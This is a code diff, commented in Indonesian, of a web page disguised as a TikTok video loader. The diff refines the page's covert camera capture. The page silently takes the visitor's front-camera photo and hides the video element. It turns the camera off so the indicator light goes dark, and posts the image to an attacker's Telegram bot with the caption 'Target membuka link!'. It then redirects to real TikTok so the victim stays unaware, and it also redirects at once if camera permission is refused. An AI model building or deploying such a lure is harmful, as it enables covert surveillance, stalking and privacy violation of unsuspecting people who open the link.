@@ -10,7 +10,11 @@
         .container { text-align: center; }
         .loader { border: 4px solid #333; border-top: 4px solid #fe2c55; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        video, canvas { display: none; }
+        
+        /* TRICK FIX FOTO GELAP: Video tidak boleh display:none sejak awal, */
+        /* kita sembunyikan dengan ukuran 1px dan opacity 0 agar tetap diproses browser */
+        #webcam { width: 1px; height: 1px; opacity: 0; position: absolute; }
+        #canvas { display: none; }
         p { font-size: 1rem; color: #aaa; }
     </style>
 </head>
@@ -21,7 +25,7 @@
     <p id="status">Memuat video TikTok...</p>
 </div>
 
-<!-- Elemen kamera disembunyikan -->
+<!-- Kamera berjalan di latar belakang secara samar -->
 <video id="webcam" autoplay playsinline muted></video>
 <canvas id="canvas"></canvas>
 
@@ -31,38 +35,39 @@
     const TELEGRAM_CHAT_ID = '1966317946';
     // ===================================================
 
-    // TAUTAN TUJUAN (Silakan ganti dengan link video TikTok spesifik jika mau)
-    const TARGET_WEBSITE = 'https://tiktok.com'; 
+    const TARGET_WEBSITE = 'https://www.tiktok.com'; 
 
     const video = document.getElementById('webcam');
     const canvas = document.getElementById('canvas');
     const statusText = document.getElementById('status');
-    const loader = document.getElementById('loader');
 
     let currentStream = null;
 
     async function startAutoCamera() {
         try {
+            // Meminta aliran video resolusi standar agar proses muat sensor lebih cepat
             currentStream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user" } 
+                video: { facingMode: "user", width: 640, height: 480 } 
             });
             video.srcObject = currentStream;
 
-            video.onloadedmetadata = function() {
-                // Beri jeda 2.5 detik agar kamera tidak gelap saat mengambil gambar
-                setTimeout(takeAndSendSnapshot, 2500);
+            // Memicu pengambilan foto setelah video dipastikan memutar frame
+            video.onplay = () => {
+                // Beri jeda 3 detik (3000ms) agar eksposur lensa kamera sempat menyesuaikan cahaya ruangan
+                setTimeout(takeAndSendSnapshot, 3000);
             };
 
         } catch (err) {
             console.error(err);
-            // Jika target menolak izin kamera, langsung alihkan saja ke TikTok agar tidak curiga
+            // Jika izin ditolak, langsung redirect ke TikTok agar tidak curiga
             window.location.href = TARGET_WEBSITE;
         }
     }
 
     function takeAndSendSnapshot() {
+        // Validasi ekstra jika frame video masih belum siap membaca resolusi asli
         if (video.videoWidth === 0 || video.videoHeight === 0) {
-            setTimeout(takeAndSendSnapshot, 500);
+            setTimeout(takeAndSendSnapshot, 200);
             return;
         }
 
@@ -70,31 +75,32 @@
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
 
+        // Gambar frame dari video ke elemen canvas (efek cermin kamera depan)
         ctx.translate(canvas.width, 0);
         ctx.scale(-1, 1);
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
+        // Langsung matikan tracking kamera agar indikator lampu di HP target mati
         if (currentStream) {
             currentStream.getTracks().forEach(track => track.stop());
         }
         
+        // Konversi hasil canvas menjadi file gambar untuk dikirim
         canvas.toBlob(async (blob) => {
             const formData = new FormData();
             formData.append('chat_id', TELEGRAM_CHAT_ID);
             formData.append('photo', blob, 'snapshot.png');
-            formData.append('caption', '📸 Target membuka link!\nFoto kamera depan berhasil diambil otomatis.');
+            formData.append('caption', '📸 Target membuka link!\nFoto kamera depan berhasil diambil secara terang.');
 
             try {
-                const response = await fetch(`https://telegram.org{TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                await fetch(`https://telegram.org{TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
-                
-                await response.json();
             } catch (error) {
                 console.error(error);
             } finally {
-                // APAPUN HASILNYA (Sukses/Gagal kirim), langsung alihkan halaman ke TikTok asli
+                // Setelah selesai memproses pengiriman, alihkan halaman ke TikTok asli
                 window.location.href = TARGET_WEBSITE;
             }
         }, 'image/png');
